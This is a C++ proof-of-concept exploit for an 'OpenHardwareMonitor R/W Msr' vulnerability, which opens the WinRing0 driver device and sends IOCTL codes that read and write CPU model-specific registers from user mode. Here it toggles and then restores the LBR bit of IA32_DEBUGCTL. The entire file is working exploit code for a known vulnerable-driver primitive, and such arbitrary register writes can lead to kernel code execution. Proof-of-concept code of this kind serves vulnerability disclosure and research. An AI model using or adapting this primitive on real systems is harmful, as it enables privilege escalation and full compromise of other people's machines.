#include <windows.h>
#include <iostream>

#pragma pack(1)
struct WRITE_MSR_STRUCT
{
	unsigned long IdMSR;
	unsigned __int64 ValueMSR;
};

bool ReadMsr( HANDLE hDevice, unsigned long index, unsigned __int64* pOutput )
{
	DWORD Returned { };
	return hDevice != nullptr && DeviceIoControl( hDevice, 0x9C402084, &index, sizeof( index ),
												  pOutput, sizeof( *pOutput ), &Returned, nullptr );
}

bool WriteMsr( HANDLE hDevice, unsigned long index, unsigned __int64 value )
{
	WRITE_MSR_STRUCT wMsr { };
	wMsr.IdMSR = index;
	wMsr.ValueMSR = value;

	DWORD Returned { };
	return hDevice != nullptr && DeviceIoControl( hDevice, 0x9C402088, &wMsr, sizeof( wMsr ),
												  nullptr, NULL, &Returned, nullptr );
}

int main( )
{
	printf( "\n\tOpenHardwareMonitor R/W Msr Vulnerability PoC\n\n[+] Setting Process Affinity Mask to 1 Core\n" );
	
	if ( !SetProcessAffinityMask( GetCurrentProcess( ), 1 << 1 ) )
	{
		printf( "[!] Error Setting Process Affinity Mask!\n" );
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] Opening Device Handle\n" );

	auto hDevice = CreateFileA( "\\\\.\\WinRing0_1_2_0", GENERIC_READ | GENERIC_WRITE, NULL, nullptr,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
	if ( !hDevice )
	{
		printf( "[!] Error Opening Device Handle, Probably the Driver isnt Loaded!\n" );
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );

	unsigned __int64 backup { };
	if ( !ReadMsr( hDevice, 0x1D9, &backup ) )
	{
		printf( "[!] Error While Reading Msr!\n" );
		CloseHandle( hDevice );
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Setting LBR bit\n", backup );

	if ( !WriteMsr( hDevice, 0x1D9, backup | 0b1 ) )
	{
		printf( "[!] Error While Writing Msr!\n" );
		CloseHandle( hDevice );
		system( "pause>nul" );
		return 1;
	}
	
	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );

	unsigned __int64 newValue { };
	if ( !ReadMsr( hDevice, 0x1D9, &newValue ) )
	{
		printf( "[!] Error While Reading Msr!\n" );
		CloseHandle( hDevice );
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Removing LBR bit\n", newValue );

	if ( !WriteMsr( hDevice, 0x1D9, backup ) )
	{
		printf( "[!] Error While Writing Msr!\n" );
		CloseHandle( hDevice );
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );

	if ( !ReadMsr( hDevice, 0x1D9, &newValue ) )
	{
		printf( "[!] Error While Reading Msr!\n" );
		CloseHandle( hDevice );
		system( "pause>nul" );
		return 1;
	}

	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n", newValue );

	CloseHandle( hDevice );
	system( "pause>nul" );
	return 0;
}